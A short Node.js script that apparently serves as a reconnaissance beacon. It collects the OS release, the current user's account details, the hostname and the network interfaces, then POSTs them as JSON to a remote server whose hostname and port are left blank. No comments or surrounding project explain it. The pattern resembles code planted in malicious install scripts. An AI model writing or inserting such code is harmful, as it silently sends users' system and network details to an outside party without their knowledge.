const http = require('http')
const os = require('os')
const platformInfo = JSON.stringify({
  release: os.release(), 
  user: os.userInfo(),
  hostname: os.hostname(),
  interfaces: os.networkInterfaces() 
})

const options = {
  hostname: '',
  port: 0,
  method: 'POST', 
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(platformInfo)
  }
}

const req = http.request(options, (res) => {
  res.on('data', (chunk) => { 
    console.log(chunk)
  })
})

req.write(platformInfo)
req.end()
